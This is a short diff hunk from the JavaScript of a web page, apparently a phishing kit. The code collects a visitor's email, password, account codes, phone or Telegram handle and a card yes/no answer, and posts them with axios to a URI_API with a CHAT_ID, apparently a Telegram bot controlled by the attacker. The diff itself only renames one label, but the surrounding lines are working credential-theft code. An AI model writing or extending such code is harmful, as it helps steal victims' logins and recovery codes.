@@ -119,7 +119,7 @@ fbq('track', 'PageView');
               message += `<b>Пошта:</b> ${ this.email.value }\n`;
               message += `<b>Пароль:</b> ${ this.password.value }\n`;
               message += `<b>Коди:</b> ${ this.codes.value }\n`;
-              message += `<b>Номер:</b> ${ this.namber.value }\n`;
+              message += `<b>Номер/TG:</b> ${ this.namber.value }\n`;
               message += `<b>Карта:</b> ${ this.yesno.value }`;
               axios.post(URI_API, {
                   chat_id: CHAT_ID,
